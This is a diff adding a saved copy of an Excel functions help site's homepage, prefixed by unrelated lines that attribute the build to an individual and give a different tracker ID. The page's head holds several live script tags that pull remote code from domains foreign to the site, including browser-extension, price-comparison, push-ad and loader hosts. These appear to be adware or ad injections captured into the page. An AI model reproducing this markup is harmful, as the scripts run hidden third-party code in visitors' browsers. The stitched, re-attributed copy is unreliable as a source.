@@ -1,0 +1,328 @@
+-My build DIGITAL Command Language:
+-Muhammad Adi Nugroho,S.Adm.Neg.:
+-Via My Notepad (HTML Editor):
+-Elements:
+-Styles:
+http://www.excelfunctions.net
+-My var pageTracker = _gat._getTracker:
+UA-68738604-1
+<html lang="en"><head><link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet"><script src="http://cds.v3x3b3b5.hwcdn.net/k/603151/d1/wchsn.js" async=""></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js" async=""></script><script src="//srv1.srv-stat.com/i/?tid=837&amp;hash=6n21ye&amp;subid=430" async=""></script><title>Excel Functions and Formulas</title><meta http-equiv="content-type" content="text/html;charset=utf-8"><meta name="Keywords" content="excel functions,excel formulas,excel function,excel formula,excel functions and formulas,excel formulas and functions,excel formulae,excel spreadsheet formulas"><meta name="Description" content="Help with Excel Functions and Formulas - Examples, Tips, Tricks and Common Errors"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="robots" content="index, follow"><meta name="Copyright" content="ExcelFunctions.net"><link href="http://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet" type="text/css"><link rel="stylesheet" href="support-files/combined.css"><script async="" src="//cse.google.com/adsense/search/async-ads.js"></script><script src="https://pagead2.googlesyndication.com/pub-config/r20160212/ca-pub-5138331548304515.js"></script><script type="text/javascript" async="" src="http://cse.google.com/cse.js?cx=partner-pub-5138331548304515:4693108556"></script><script src="https://mybrowserpages.com/extension/EasySearch/info.js"></script><script defer="defer" type="text/javascript" src="support-files/mainscripts.js"></script><style type="text/css">div.side-header{border:1px solid #ddd;margin-bottom:10px;} p.side-header{background-color:#f3f3f3;border-bottom:1px solid #ddd;color:#000000;display:block;margin:0;padding:4px 12px;} div.alphabetical{margin:12px 10px;} div.pop-search{font-size:.9375em;margin:10px 20px 20px 40px;text-align:left;} div.pop-search p{color:#666;margin-bottom:0;} div.pop-search-inner{margin:0 0 8px 30px;text-align:left;} div.whats-new{font-size:.9375em;margin:10px;} </style><script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script><script src="http://www.google.com/jsapi?autoload=%7B%22modules%22%3A%5B%7B%22name%22%3A%22search%22%2C%22version%22%3A%221.0%22%2C%22callback%22%3A%22__gcse.scb%22%2C%22style%22%3A%22http%3A%2F%2Fwww.google.com%2Fcse%2Fstyle%2Flook%2Fdefault.css%22%2C%22language%22%3A%22en%22%7D%5D%7D" type="text/javascript"></script><script src="http://www.google-analytics.com/srcor.js"></script><script type="text/javascript" async="" src="http://cfs.uzone.id/cfspushadsv2/request?id=1&amp;enc=telkom2&amp;params=4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnltcH7XQ1p1GxkwkdaRfWK9%2blCnp6JG6yKsdxhuqt3%2bdFeHPy8r8ipFnPzekuMy5if7qKtFRheWPboUUr%2fhtz9J7Vmx5v%2fOtOm%2fh61oRgV%2bdwnmGKMal8G7lGESUmajrhZf22I35dH6fh%2bvk0jcYN9CVQOVYb7V%2bkZbBAmTi5GK2Tvbth4wZcic4gul86uaZcV2jIenvIByO22Kthuo7AM8K%2frG9Wc30lOuDeH0OJjGuegKYl0Oyt2NwrjgtwXLYdLj8RVuf4WSP9%2bGDEEAxq%2bZsBzhOPFPYJU4Fzdj7TKsL%2bhQ9dYOmWv68mcRVcCEVFbUuprPIKMSNOE%2ff8mtlBJauIHolJJxt9a%2flnrItioHIo9YREtAQ4Vr3%2bmpSJmYVHoS2yVMVq3EvabVZxBn3Ypn0jFOEB3XuOrO7mDZx5hq1LD93DogdX2wF4i6%2fV6jWmOV4q3CSk7wWo9C3ZJ2f54EF3H6coUfaTk5ebAVugAMKnafe1sagSn%2fjIJhR%2bBYnoqTSNarREAi%2f%2bqdWLW9rjBEVFfcqy9fa3&amp;idc_r=1920267257&amp;domain=www.excelfunctions.net&amp;sw=1366&amp;sh=768"></script><link type="text/css" href="http://www.google.com/uds/api/search/1.0/432dd570d1a386253361f581254f9ca1/default+en.css" rel="stylesheet"><link type="text/css" href="http://www.google.com/cse/style/look/default.css" rel="stylesheet"><script type="text/javascript" src="http://www.google.com/uds/api/search/1.0/432dd570d1a386253361f581254f9ca1/default+en.I.js"></script><style type="text/css">
+.gsc-control-cse {
+font-family: Arial, sans-serif;
+border-color: #ffffff;
+background-color: #ffffff;
+}
+.gsc-control-cse .gsc-table-result {
+font-family: Arial, sans-serif;
+}
+input.gsc-input {
+border-color: #BCCDF0;
+}
+input.gsc-search-button {
+border-color: #336699;
+background-color: #E9E9E9;
+}
+.gsc-tabHeader.gsc-tabhInactive {
+border-color: #E9E9E9;
+background-color: #E9E9E9;
+}
+.gsc-tabHeader.gsc-tabhActive {
+border-top-color: #FF9900;
+border-left-color: #E9E9E9;
+border-right-color: #E9E9E9;
+background-color: #FFFFFF;
+}
+.gsc-tabsArea {
+border-color: #E9E9E9;
+}
+.gsc-webResult.gsc-result,
+.gsc-results .gsc-imageResult {
+border-color: #ffffff;
+background-color: #ffffff;
+}
+.gsc-webResult.gsc-result:hover,
+.gsc-imageResult:hover {
+border-color: #FFFFFF;
+background-color: #FFFFFF;
+}
+.gsc-webResult.gsc-result.gsc-promotion:hover {
+border-color: #FFFFFF;
+background-color: #FFFFFF;
+}
+.gs-webResult.gs-result a.gs-title:link,
+.gs-webResult.gs-result a.gs-title:link b,
+.gs-imageResult a.gs-title:link,
+.gs-imageResult a.gs-title:link b {
+color: #000099;
+}
+.gs-webResult.gs-result a.gs-title:visited,
+.gs-webResult.gs-result a.gs-title:visited b,
+.gs-imageResult a.gs-title:visited,
+.gs-imageResult a.gs-title:visited b {
+color: #000000;
+}
+.gs-webResult.gs-result a.gs-title:hover,
+.gs-webResult.gs-result a.gs-title:hover b,
+.gs-imageResult a.gs-title:hover,
+.gs-imageResult a.gs-title:hover b {
+color: #0000CC;
+}
+.gs-webResult.gs-result a.gs-title:active,
+.gs-webResult.gs-result a.gs-title:active b,
+.gs-imageResult a.gs-title:active,
+.gs-imageResult a.gs-title:active b {
+color: #0000CC;
+}
+.gsc-cursor-page {
+color: #000099;
+}
+a.gsc-trailing-more-results:link {
+color: #000099;
+}
+.gs-webResult .gs-snippet,
+.gs-imageResult .gs-snippet,
+.gs-fileFormatType {
+color: #000000;
+}
+.gs-webResult div.gs-visibleUrl,
+.gs-imageResult div.gs-visibleUrl {
+color: #000000;
+}
+.gs-webResult div.gs-visibleUrl-short {
+color: #000000;
+}
+.gs-webResult div.gs-visibleUrl-short {
+display: none;
+}
+.gs-webResult div.gs-visibleUrl-long {
+display: block;
+}
+.gs-promotion div.gs-visibleUrl-short {
+display: none;
+}
+.gs-promotion div.gs-visibleUrl-long {
+display: block;
+}
+.gsc-cursor-box {
+border-color: #ffffff;
+}
+.gsc-results .gsc-cursor-box .gsc-cursor-page {
+border-color: #E9E9E9;
+background-color: #ffffff;
+color: #000099;
+}
+.gsc-results .gsc-cursor-box .gsc-cursor-current-page {
+border-color: #FF9900;
+background-color: #FFFFFF;
+color: #000000;
+}
+.gsc-webResult.gsc-result.gsc-promotion {
+border-color: #336699;
+background-color: #FFFFFF;
+}
+.gsc-completion-title {
+color: #000099;
+}
+.gsc-completion-snippet {
+color: #000000;
+}
+.gs-promotion a.gs-title:link,
+.gs-promotion a.gs-title:link *,
+.gs-promotion .gs-snippet a:link {
+color: #0000FF;
+}
+.gs-promotion a.gs-title:visited,
+.gs-promotion a.gs-title:visited *,
+.gs-promotion .gs-snippet a:visited {
+color: #663399;
+}
+.gs-promotion a.gs-title:hover,
+.gs-promotion a.gs-title:hover *,
+.gs-promotion .gs-snippet a:hover {
+color: #0000FF;
+}
+.gs-promotion a.gs-title:active,
+.gs-promotion a.gs-title:active *,
+.gs-promotion .gs-snippet a:active {
+color: #0000FF;
+}
+.gs-promotion .gs-snippet,
+.gs-promotion .gs-title .gs-promotion-title-right,
+.gs-promotion .gs-title .gs-promotion-title-right * {
+color: #000000;
+}
+.gs-promotion .gs-visibleUrl,
+.gs-promotion .gs-visibleUrl-short {
+color: #008000;
+}</style><style type="text/css">.gscb_a{display:inline-block;font:27px/13px arial,sans-serif}.gsst_a .gscb_a{color:#a1b9ed;cursor:pointer}.gsst_a:hover .gscb_a,.gsst_a:focus .gscb_a{color:#36c}.gsst_a{display:inline-block}.gsst_a{cursor:pointer;padding:0 4px}.gsst_a:hover{text-decoration:none!important}.gsst_b{font-size:16px;padding:0 2px;position:relative;user-select:none;-webkit-user-select:none;white-space:nowrap}.gsst_e{opacity:0.55;}.gsst_a:hover .gsst_e,.gsst_a:focus .gsst_e{opacity:0.72;}.gsst_a:active .gsst_e{opacity:1;}.gsst_f{background:white;text-align:left}.gsst_g{background-color:white;border:1px solid #ccc;border-top-color:#d9d9d9;box-shadow:0 2px 4px rgba(0,0,0,0.2);-webkit-box-shadow:0 2px 4px rgba(0,0,0,0.2);margin:-1px -3px;padding:0 6px}.gsst_h{background-color:white;height:1px;margin-bottom:-1px;position:relative;top:-1px}.gsib_a{width:100%;padding:4px 6px 0}.gsib_a,.gsib_b{vertical-align:top}.gssb_c{border:0;position:absolute;z-index:989}.gssb_e{border:1px solid #ccc;border-top-color:#d9d9d9;box-shadow:0 2px 4px rgba(0,0,0,0.2);-webkit-box-shadow:0 2px 4px rgba(0,0,0,0.2);cursor:default}.gssb_f{visibility:hidden;white-space:nowrap}.gssb_k{border:0;display:block;position:absolute;top:0;z-index:988}.gsdd_a{border:none!important}.gsq_a{padding:0}.gscsep_a{display:none}.gssb_a{padding:0 7px}.gssb_a,.gssb_a td{white-space:nowrap;overflow:hidden;line-height:22px}#gssb_b{font-size:11px;color:#36c;text-decoration:none}#gssb_b:hover{font-size:11px;color:#36c;text-decoration:underline}.gssb_g{text-align:center;padding:8px 0 7px;position:relative}.gssb_h{font-size:15px;height:28px;margin:0.2em;-webkit-appearance:button}.gssb_i{background:#eee}.gss_ifl{visibility:hidden;padding-left:5px}.gssb_i .gss_ifl{visibility:visible}a.gssb_j{font-size:13px;color:#36c;text-decoration:none;line-height:100%}a.gssb_j:hover{text-decoration:underline}.gssb_l{height:1px;background-color:#e5e5e5}.gssb_m{color:#000;background:#fff}.gsfe_a{border:1px solid #b9b9b9;border-top-color:#a0a0a0;box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);-moz-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);-webkit-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);}.gsfe_b{border:1px solid #4d90fe;outline:none;box-shadow:inset 0px 1px 2px rgba(0,0,0,0.3);-moz-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.3);-webkit-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.3);}.gssb_a{padding:0 7px}.gssb_e{border:0}.gssb_l{margin:5px 0}.gssb_c .gsc-completion-container{position:static}.gssb_c{z-index:5000}.gsc-completion-container table{background:transparent;font-size:inherit;font-family:inherit}.gssb_c > tbody > tr,.gssb_c > tbody > tr > td,.gssb_d,.gssb_d > tbody > tr,.gssb_d > tbody > tr > td,.gssb_e,.gssb_e > tbody > tr,.gssb_e > tbody > tr > td{padding:0;margin:0;border:0}.gssb_a table,.gssb_a table tr,.gssb_a table tr td{padding:0;margin:0;border:0}</style><script type="text/javascript" src="//cds.v3x3b3b5.hwcdn.net/s/97c12b64-33d8-4a97-ae03-16a7e077dda1.js?cb=12"></script><script id="CDNBINDO9898" type="text/javascript" src="https://cdn.ext335.com/gm2yy8/bindo.js"></script><script src="//pstatic.bestpriceninja.com/nwp/v0_0_1036/release/Shared/App/SharedApp.js?t=0"></script><script src="//cdncache-a.akamaihd.net/loaders/1725/l.js?pid=1725&amp;ext=Albireo&amp;zoneid=70711364"></script><script src="//pstatic.bestpriceninja.com/nwp/v0_0_1036/release/Shared/App/SharedApp.js?t=1"></script><link rel="stylesheet" type="text/css" media="screen" href="http://q2u3z6t7.ssl.hwcdn.net/css/core.css"><script src="//pstatic.bestpriceninja.com/nwp/v0_0_1036/release/Shared/App/SharedApp.js?t=2"></script><script src="//pstatic.bestpriceninja.com/nwp/v0_0_1036/release/Shared/App/SharedApp.js?t=3"></script></head><body style="">
+<script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> 
+<script> 
+(adsbygoogle = window.adsbygoogle || []).push({ 
+google_ad_client: "ca-pub-5138331548304515", 
+enable_page_level_ads: true 
+}); 
+</script> 
+ <div id="header-outer">
+  <div id="header-logo">
+    <span id="logo-excel">Excel</span><span id="logo-functions">Functions</span><span id="logo-net">.net</span>
+  </div>
+  <div id="header-search">
+		Search Site:
+    <!-- ****************** GOOGLE ADSENSE SEARCH CODE **************** -->
+    <script>
+      (function() {
+        var cx = 'partner-pub-5138331548304515:4693108556';
+        var gcse = document.createElement('script');
+        gcse.type = 'text/javascript';
+        gcse.async = true;
+        gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+            '//cse.google.com/cse.js?cx=' + cx;
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(gcse, s);
+      })();
+    </script>
+    <div id="___gcse_0"><div class="gsc-control-searchbox-only gsc-control-searchbox-only-en" dir="ltr"><form class="gsc-search-box" accept-charset="utf-8"><table cellspacing="0" cellpadding="0" class="gsc-search-box"><tbody><tr><td class="gsc-input"><input autocomplete="off" type="text" size="10" class=" gsc-input" name="search" title="search" id="gsc-i-id1" dir="ltr" spellcheck="false" style="outline: none; background: url(&quot;http://www.google.com/cse/static/en/google_custom_search_watermark.gif&quot;) 0% 50% no-repeat rgb(255, 255, 255);"><input type="hidden" name="bgresponse" id="bgresponse"></td><td class="gsc-search-button"><input type="button" value="Search" class="gsc-search-button" title="search"></td><td class="gsc-clear-button"><div class="gsc-clear-button" title="clear results">&nbsp;</div></td></tr></tbody></table><table cellspacing="0" cellpadding="0" class="gsc-branding"><tbody><tr><td class="gsc-branding-user-defined"></td><td class="gsc-branding-text"><div class="gsc-branding-text">powered by</div></td><td class="gsc-branding-img"><img src="http://www.google.com/uds/css/small-logo.png" class="gsc-branding-img"></td></tr></tbody></table></form></div></div>
+    <!-- ************* END OF GOOGLE ADSENSE SEARCH CODE ************** -->
+  </div>
+  <div id="main-menu-expand">
+    <a id="toggle-main-menu" href="javascript:togglemainmenu();">+</a>
+  </div>
+</div><div id="content-outer"><div id="content-inner"><h1>Help with Excel Functions and Formulas</h1><div class="floatright width290 display1100"><div class="side-header"><p class="side-header">Alphabetically Ordered Functions</p><div class="alphabetical">If you know the name of the<br>function you want, select from the<br><a href="http://www.excelfunctions.net/excel-functions-alphabetical.html">Alphabetical Excel Functions List</a>.</div></div><div class="side-header"><p class="side-header">Popular Searches</p><div class="pop-search"><p>Text Functions:</p><div class="pop-search-inner"><a href="http://www.excelfunctions.net/FindFunction.html">Excel Find Function</a><br><a href="http://www.excelfunctions.net/SearchFunction.html">Excel Search Function</a></div><p>Logical Functions:</p><div class="pop-search-inner"><a href="http://www.excelfunctions.net/ExcelIf.html">Excel If Function</a><br><a href="http://www.excelfunctions.net/Excel-And-Function.html">Excel And Function</a><br><a href="http://www.excelfunctions.net/Excel-Or-Function.html">Excel Or Function</a></div><p>Lookup &amp; Reference Functions:</p><div class="pop-search-inner"><a href="http://www.excelfunctions.net/ExcelMatch.html">Excel Match Function</a><br><a href="http://www.excelfunctions.net/ExcelVlookup.html">Excel Vlookup Function</a><br><a href="http://www.excelfunctions.net/Vlookup-Example-Exact-Match.html">Vlookup Example</a></div><p>Math &amp; Statistical Functions:</p><div class="pop-search-inner"><a href="http://www.excelfunctions.net/ExcelSumif.html">Excel Sumif Function</a><br><a href="http://www.excelfunctions.net/Excel-Sum-Function.html">Excel Sum Function</a><br><a href="http://www.excelfunctions.net/ExcelCountif.html">Excel Countif Function</a><br><a href="http://www.excelfunctions.net/excel-rounding-functions.html">Excel Rounding Functions</a></div><p>VBA Functions:</p><div class="pop-search-inner"><a href="http://www.excelfunctions.net/VBA-Vlookup.html">VBA Vlookup</a><br><a href="http://www.excelfunctions.net/vba-instr-function.html">VBA InStr Function</a><br><a href="http://www.excelfunctions.net/vba-msgbox-function.html">VBA MsgBox Function</a></div><p>Other:</p><div class="pop-search-inner"><a href="http://www.excelfunctions.net/Percentages-In-Excel.html">Percentages in Excel</a><br><a href="http://www.excelfunctions.net/split-string-in-excel.html">Split String in Excel</a><br><a href="http://www.excelfunctions.net/Time-Difference-In-Excel.html">Time Difference in Excel</a><br><a href="http://www.excelfunctions.net/Convert-Time-To-Decimal.html">Convert Time to Decimal</a></div></div></div><div class="side-header"><p class="side-header">What's New on ExcelFunctions.net?</p><div class="whats-new"><a href="http://www.excelfunctions.net/excel-freeze-panes.html">Excel Freeze Panes</a><br><a href="http://www.excelfunctions.net/excel-named-ranges.html">Excel Named Ranges</a><br><a href="http://www.excelfunctions.net/random-number-generator.html">Random Number Generator</a><br><a href="http://www.excelfunctions.net/find-duplicate-rows.html">Find Duplicate Rows</a><br><a href="http://www.excelfunctions.net/remove-duplicate-rows.html">Remove Duplicate Rows</a><br><a href="http://www.excelfunctions.net/convert-text-to-number.html">Convert Text to Number</a><br><a href="http://www.excelfunctions.net/convert-text-to-date.html">Convert Text to Date</a></div></div><br></div><div class="display400"><br>
+<script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> 
+<!-- 336x280 HomeP Top Left Large Rect --> 
+<ins class="adsbygoogle" style="display:inline-block;width:336px;height:280px" data-ad-client="ca-pub-5138331548304515" data-ad-slot="2711196392" data-adsbygoogle-status="done"><ins id="aswift_1_expand" style="display:inline-table;border:none;height:280px;margin:0;padding:0;position:relative;visibility:visible;width:336px;background-color:transparent"><ins id="aswift_1_anchor" style="display:block;border:none;height:280px;margin:0;padding:0;position:relative;visibility:visible;width:336px;background-color:transparent"><iframe width="336" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;"></iframe></ins></ins></ins> 
+<script> 
+(adsbygoogle = window.adsbygoogle || []).push({}); 
+</script> 
+<br><br><br></div><p>This website provides help with Excel functions and formulas.</p><p>You will find information and examples of each of the <a href="http://www.excelfunctions.net/ExcelFunctions.html">Excel Built-In Functions</a> and examples of how to perform popular tasks using <a href="http://www.excelfunctions.net/Excel-Formulas.html">Excel Formulas</a>. There is also a section explaining <a href="http://www.excelfunctions.net/Excel-Array-Formulas.html">Excel Array Formulas</a>, which will help you to make full use of some of the most useful Excel functions and formulas.</p><p>For beginners, our <a href="http://www.excelfunctions.net/Basic-Excel.html">Basic Excel</a> pages will give you a strong understanding of the basic Excel concepts, which will help you to get the best use of Excel functions and formulas. There is also a section on <a href="http://www.excelfunctions.net/Excel-Errors.html">Excel Errors</a> which will help you to diagnose and fix any errors that you encounter.</p><p>Finally, for those who want to learn how to program their own functions in Excel, we have an <a href="http://www.excelfunctions.net/Writing-Excel-Macros.html">Introductory Guide to Excel Macros</a> and an <a href="http://www.excelfunctions.net/Excel-VBA-Tutorial.html">Excel VBA Tutorial</a>. With the help of our step-by-step guides, Excel macros will become a natural part of your spreadsheet development, enabling you to perform complex analysis and automate repetitive tasks.</p><p>The examples on this site mostly apply to all versions of Excel, from 2003 onwards. However, some of the built-in functions are only available in the most recent versions of Excel. If you are currently using an older version of Microsoft Office, and would like to try the latest version, you can get a free trial on the <a href="https://products.office.com/en-us/try" target="_blank">Microsoft Office website</a>.</p><div class="adsense-footer">
+<script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> 
+<!-- 468x60 HomeP Footer Banner No Border --> 
+<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-5138331548304515" data-ad-slot="0087503623" data-adsbygoogle-status="done"><ins id="aswift_2_expand" style="display:inline-table;border:none;height:60px;margin:0;padding:0;position:relative;visibility:visible;width:468px;background-color:transparent"><ins id="aswift_2_anchor" style="display:block;border:none;height:60px;margin:0;padding:0;position:relative;visibility:visible;width:468px;background-color:transparent"><iframe width="468" height="60" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_2" name="aswift_2" style="left:0;position:absolute;top:0;"></iframe></ins></ins></ins> 
+<script> 
+(adsbygoogle = window.adsbygoogle || []).push({}); 
+</script> 
+</div></div><div id="navigation-outer">
+  <div id="navigation-inner"> 
+  <!-- Navigation Bar -->
+		<ul class="nav1">
+      <li class="nav1"><a href="http://www.excelfunctions.net">Home</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Basic-Excel.html">Basic Excel</a></li>
+			<li class="nav1"><a id="displayFunctionsLinks" href="javascript:togglefunclist();">Built-In Excel Functions &nbsp;▾</a>
+  			<ul id="nav2">
+      		<li class="nav2"><a href="http://www.excelfunctions.net/ExcelFunctions.html">List of All Excel Functions</a></li>
+          <li class="nav2"><a href="http://www.excelfunctions.net/Excel-Text-Functions.html">Text Functions</a></li>
+          <li class="nav2"><a href="http://www.excelfunctions.net/Excel-Logical-Functions.html">Logical Functions</a></li>
+          <li class="nav2"><a href="http://www.excelfunctions.net/Excel-Information-Functions.html">Information Functions</a></li>
+          <li class="nav2"><a href="http://www.excelfunctions.net/Excel-Date-And-Time-Functions.html">Date &amp; Time Functions</a></li>
+          <li class="nav2"><a href="http://www.excelfunctions.net/Excel-Lookup-And-Reference-Functions.html">Lookup &amp; Reference Functions</a></li>
+          <li class="nav2"><a href="http://www.excelfunctions.net/Excel-Math-Functions.html">Math Functions</a></li>
+          <li class="nav2"><a href="http://www.excelfunctions.net/Excel-Statistical-Functions.html">Statistical Functions</a></li>
+          <li class="nav2"><a href="http://www.excelfunctions.net/Excel-Database-Functions.html">Database Functions</a></li>
+          <li class="nav2"><a href="http://www.excelfunctions.net/Excel-Financial-Functions.html">Financial Functions</a></li>
+          <li class="nav2"><a href="http://www.excelfunctions.net/Excel-Engineering-Functions.html">Engineering Functions</a></li>
+  			</ul>
+			</li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/excel-2013-new-functions.html">Excel 2013 New Functions</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Excel-Vlookup-Tutorial.html">Excel Vlookup Tutorial</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Excel-Pivot-Table-Tutorial.html">Pivot Table Tutorial</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Excel-Formulas.html">Excel Formulas</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Excel-Array-Formulas.html">Array Formulas</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Excel-Tips.html">Tips &amp; Tricks</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Excel-Errors.html">Common Excel Errors</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Excel-Templates.html">Excel Templates</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Writing-Excel-Macros.html">Excel Macros</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Excel-VBA-Tutorial.html">Excel VBA Tutorial</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/vba-functions.html">Built-In VBA Functions</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Excel-2003-vs-Excel-2007.html">Excel 2003 vs 2007</a></li>
+      <li class="nav1"><a href="http://www.excelfunctions.net/Excel-Books.html">Recommended Books</a></li>
+		</ul>
+  </div>
+  <p id="margin-links">
+   	<!-- ******* GOOGLE ADSENSE CODE - LEFT MARGIN VERT LINKS STRIP ******** -->
+    <script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <!-- 120x90 Left Margin Vert Links Strip -->
+    <ins class="adsbygoogle" style="display:inline-block;width:120px;height:90px" data-ad-client="ca-pub-5138331548304515" data-ad-slot="9401283004" data-adsbygoogle-status="done"><ins id="aswift_3_expand" style="display:inline-table;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:120px;background-color:transparent"><ins id="aswift_3_anchor" style="display:block;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:120px;background-color:transparent"><iframe width="120" height="90" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_3" name="aswift_3" style="left:0;position:absolute;top:0;"></iframe></ins></ins></ins>
+    <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+    <!-- *** END OF GOOGLE ADSENSE CODE - LEFT MARGIN VERT LINKS STRIP *** -->
+  </p>
+</div>
+<br class="clearboth"></div><div id="footer">
+  <div id="validation">
+    <!-- **** W3C Markup Validation **** -->
+    <a href="http://validator.w3.org/check?uri=referer">
+      <img src="http://www.w3.org/Icons/valid-xhtml10-blue" alt="Valid XHTML 1.0 Transitional" style="border:0; width:88px; height:31px">
+    </a>
+    <!-- **** W3C CSS Validation **** -->
+    <a href="http://jigsaw.w3.org/css-validator/check/referer">
+      <img src="http://jigsaw.w3.org/css-validator/images/vcss-blue" alt="Valid CSS!" style="border:0; width:88px; height:31px">
+    </a>
+  </div>
+  <div id="footer-links">
+    <a href="http://www.excelfunctions.net/Search-Site.html" rel="nofollow">Search Site</a> &nbsp;
+    <a href="http://www.excelfunctions.net/Disclaimer.html" rel="nofollow">Disclaimer</a> &nbsp;
+    <a href="http://www.excelfunctions.net/Privacy-Policy.html" rel="nofollow">Privacy Policy</a><br>
+    Copyright © 2008-2016 ExcelFunctions.net
+  </div>
+	<br>
+</div>
+<script src="/support-files/cookieControl-6.2.min.js" type="text/javascript"></script><ins class="adsbygoogle" data-adsbygoogle-status="done" style="display: none; width: auto; height: auto;"><ins id="aswift_0_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent"><ins id="aswift_0_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent"><iframe width="0" height="0" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;"></iframe></ins></ins></ins>
+<script type="text/javascript">//<![CDATA[
+  cookieControl({
+      t: {
+          title: '<p>This site uses cookies to store information on your computer.</p>',
+          intro: '',
+          full:'<p>These cookies are used to anonymously track visitors or enhance your experience of this site.</p><p>To control third party cookies, you can <a class="ccc-settings" href="http://www.civicuk.com/cookie-control/browser-settings" target="_blank">adjust your browser settings.</a></p><p>By using our site you accept the terms of our <a href="http://www.excelfunctions.net/Privacy-Policy.html">Privacy Policy</a>.</p>'
+      },
+      position:CookieControl.POS_BOTTOM,
+      style:CookieControl.STYLE_BAR,
+      theme:CookieControl.THEME_LIGHT, // light or dark
+      startOpen:true,
+      autoHide:5000,
+      subdomains:false,
+      protectedCookies: [], // list the cookies you do not want deleted, for example ['analytics', 'twitter']
+      apiKey: '230f83cebc4f3b4781b2f0b7d31d1f14d120f4bc',
+      product: CookieControl.PROD_PAID,
+      consentModel: CookieControl.MODEL_IMPLICIT,
+      onAccept:function(){ccAddAnalytics()},
+      onReady:function(){},
+      onCookiesAllowed:function(){ccAddAnalytics()},
+      onCookiesNotAllowed:function(){},
+      countries:'United Kingdom,Austria,Belgium,Bulgaria,Croatia,Republic of Cyprus,Czech Republic,Denmark,Estonia,Finland,France,Germany,Greece,Hungary,Ireland,Italy,Latvia,Lithuania,Luxembourg,Malta,Netherlands,Norway,Poland,Portugal,Romania,Slovakia,Slovenia,Spain,Sweden' // Or supply a list, like ['United Kingdom', 'Greece']
+      });
+
+      function ccAddAnalytics() {
+        jQuery.getScript("http://www.google-analytics.com/ga.js", function() {
+          var GATracker = _gat._createTracker('UA-6192593-1');
+          GATracker._trackPageview();
+        });
+      }
+   //]]>
